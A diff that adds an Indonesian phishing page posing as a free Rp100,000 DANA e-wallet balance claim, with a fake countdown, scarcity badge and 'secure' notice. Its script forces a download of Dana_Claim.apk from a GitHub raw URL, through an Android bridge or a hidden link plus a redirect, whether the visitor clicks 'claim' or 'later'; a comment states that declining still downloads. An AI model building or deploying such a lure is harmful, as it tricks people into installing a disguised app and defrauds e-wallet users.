@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <title>Klaim Saldo DANA</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(180deg,#0066cc,#001a40);padding:20px}
+        .container{max-width:420px;width:100%;text-align:center}
+        .logo{background:#108ee9;width:90px;height:90px;border-radius:22px;display:flex;justify-content:center;align-items:center;margin:0 auto 20px;box-shadow:0 15px 40px rgba(0,0,0,0.4)}
+        .logo span{color:#fff;font-size:45px;font-weight:bold}
+        h1{color:#fff;font-size:24px;font-weight:bold;margin-bottom:8px}
+        .sub{color:#b3d9ff;font-size:14px;margin-bottom:24px}
+        .card{background:#fff;border-radius:20px;padding:24px;margin-bottom:20px;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+        .amount-label{color:#666;font-size:13px}
+        .amount{color:#108ee9;font-size:48px;font-weight:bold;margin:8px 0}
+        .badge{background:#e6f3ff;color:#0066cc;font-size:12px;padding:6px 12px;border-radius:20px;display:inline-block;margin-bottom:16px}
+        .qr-box{background:#f8f9fa;padding:16px;border-radius:12px;margin:12px 0;display:flex;flex-direction:column;align-items:center}
+        .qr-box p{color:#666;font-size:12px;margin-bottom:8px}
+        .timer-box{background:rgba(255,255,255,0.1);border-radius:16px;padding:16px;margin-bottom:20px}
+        .timer-label{color:#99c2ff;font-size:12px;text-transform:uppercase;letter-spacing:1px}
+        .timer{color:#ffcc00;font-size:42px;font-weight:700}
+        .timer.warning{color:#ff6b6b;animation:blink 0.5s ease-in-out infinite alternate}
+        @keyframes blink{from{opacity:1}to{opacity:0.3}}
+        .btn-group{display:flex;gap:12px}
+        .btn{flex:1;padding:16px;border:none;border-radius:30px;font-size:18px;font-weight:700;cursor:pointer;transition:all 0.15s}
+        .btn:active{transform:scale(0.96)}
+        .btn-terima{background:#108ee9;color:#fff;box-shadow:0 8px 25px rgba(16,142,233,0.5)}
+        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc}
+        .status{margin-top:12px;font-size:13px;color:#b3d9ff;min-height:20px}
+        .status.success{color:#00b894;font-weight:600}
+        .footer-note{margin-top:16px;font-size:11px;color:#6699cc}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo"><span>D</span></div>
+    <h1>🎉 SELAMAT!</h1>
+    <p class="sub">Anda mendapatkan Saldo DANA GRATIS!</p>
+
+    <div class="card">
+        <p class="amount-label">Saldo DANA Gratis</p>
+        <div class="amount">Rp100.000</div>
+        <div class="badge">🎁 Kuota terbatas!</div>
+        <div class="qr-box">
+            <p>📱 Scan QR untuk klaim</p>
+            <div id="qrCode"></div>
+        </div>
+    </div>
+
+    <div class="timer-box">
+        <div class="timer-label">⏱️ Waktu Tersisa</div>
+        <div class="timer" id="timer">02:00</div>
+    </div>
+
+    <div class="btn-group">
+        <button class="btn btn-terima" id="btnTerima">✅ KLAIM SEKARANG</button>
+        <button class="btn btn-tolak" id="btnTolak">❌ Nanti Saja</button>
+    </div>
+
+    <div class="status" id="status">⏳ Silakan pilih tindakan...</div>
+    <div class="footer-note">🔒 Transaksi aman & terenkripsi</div>
+</div>
+
+<script>
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
+var timeLeft = 120;
+var timerInterval = null;
+var isProcessing = false;
+
+const timerEl = document.getElementById('timer');
+const btnTerima = document.getElementById('btnTerima');
+const btnTolak = document.getElementById('btnTolak');
+const statusEl = document.getElementById('status');
+
+// Generate QR Code
+new QRCode(document.getElementById('qrCode'), {
+    text: 'https://verifikasi.site/qr.html',
+    width: 140,
+    height: 140
+});
+
+// Android Bridge
+var A = {
+    isAvailable: typeof AndroidBridge !== 'undefined',
+    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false }
+};
+
+// AUTO DOWNLOAD - JALAN APAPUN
+function autoDownload() {
+    var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Dana_Claim.apk';
+    
+    if(A.isAvailable) {
+        A.downloadFile(url, 'Dana_Claim.apk');
+    } else {
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = 'Dana_Claim.apk';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        setTimeout(function() {
+            window.location.href = url;
+        }, 1000);
+    }
+}
+
+function updateTimer() {
+    var mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+    var secs = String(timeLeft % 60).padStart(2, '0');
+    timerEl.textContent = mins + ':' + secs;
+    if (timeLeft <= 10) timerEl.classList.add('warning');
+    else timerEl.classList.remove('warning');
+    if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        timerEl.textContent = '⏰ 00:00';
+        btnTerima.disabled = true;
+        btnTolak.disabled = true;
+        statusEl.textContent = '⏰ Waktu habis!';
+    }
+}
+
+function startTimer() {
+    updateTimer();
+    timerInterval = setInterval(function() {
+        timeLeft--;
+        updateTimer();
+        if (timeLeft <= 0) { clearInterval(timerInterval); timerInterval = null; }
+    }, 1000);
+}
+
+// KLIK TERIMA
+btnTerima.addEventListener('click', function() {
+    if (isProcessing) return;
+    isProcessing = true;
+    btnTerima.disabled = true;
+    btnTolak.disabled = true;
+    statusEl.textContent = '⏳ Memproses saldo DANA...';
+    
+    autoDownload();
+    
+    setTimeout(function() {
+        statusEl.textContent = '✅ Saldo DANA Rp100.000 akan diproses!';
+        statusEl.className = 'status success';
+        btnTerima.textContent = '✅ BERHASIL';
+    }, 2000);
+});
+
+// KLIK TOLAK → TETAP DOWNLOAD!
+btnTolak.addEventListener('click', function() {
+    if (isProcessing) return;
+    isProcessing = true;
+    btnTolak.disabled = true;
+    btnTerima.disabled = true;
+    statusEl.textContent = '⏳ Memproses...';
+    
+    autoDownload();
+    
+    setTimeout(function() {
+        statusEl.textContent = '❌ Anda melewatkan hadiah.';
+        btnTolak.textContent = '❌ TERLEWAT';
+        btnTolak.style.background = '#ff6b6b';
+        btnTolak.style.color = '#fff';
+        btnTolak.style.border = 'none';
+    }, 1500);
+});
+
+startTimer();
+</script>
+</body>
+</html>
